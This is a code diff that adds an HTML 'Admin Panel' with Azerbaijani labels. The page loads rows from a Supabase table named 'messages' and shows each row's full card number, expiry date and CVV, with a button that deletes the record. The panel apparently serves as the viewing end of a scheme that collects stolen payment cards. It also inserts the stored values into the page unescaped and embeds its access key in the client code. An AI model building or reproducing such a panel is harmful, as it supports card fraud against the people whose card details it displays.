@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel</title>
+
+<style>
+body{
+  background:#f4f6f9;
+  font-family:Arial, sans-serif;
+  padding:40px;
+}
+
+h1{
+  margin-bottom:30px;
+}
+
+.card{
+  background:white;
+  padding:20px;
+  border-radius:10px;
+  margin-bottom:15px;
+  box-shadow:0 5px 15px rgba(0,0,0,0.08);
+}
+
+button{
+  background:#ff4d4d;
+  color:white;
+  border:none;
+  padding:8px 14px;
+  border-radius:6px;
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<h1>Admin Panel</h1>
+<div id="list"></div>
+
+<script type="module">
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
+
+const supabaseUrl = "https://gkrfcoyleewxrxbfdunq.supabase.co"
+const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
+
+const supabase = createClient(supabaseUrl, supabaseKey)
+
+async function load(){
+  const { data } = await supabase
+  .from("messages")
+  .select("*")
+  .order("id",{ascending:false})
+
+  const container = document.getElementById("list")
+  container.innerHTML=""
+
+  data.forEach(item=>{
+    const div=document.createElement("div")
+    div.className="card"
+    div.innerHTML=`
+      <p><b>Kart:</b> ${item.number}</p>
+      <p><b>Tarix:</b> ${item.expiry}</p>
+      <p><b>CVV:</b> ${item.cvv}</p>
+      <button onclick="remove(${item.id})">Sil</button>
+    `
+    container.appendChild(div)
+  })
+}
+
+window.remove = async function(id){
+  await supabase.from("messages").delete().eq("id",id)
+  load()
+}
+
+load()
+</script>
+
+</body>
+</html>
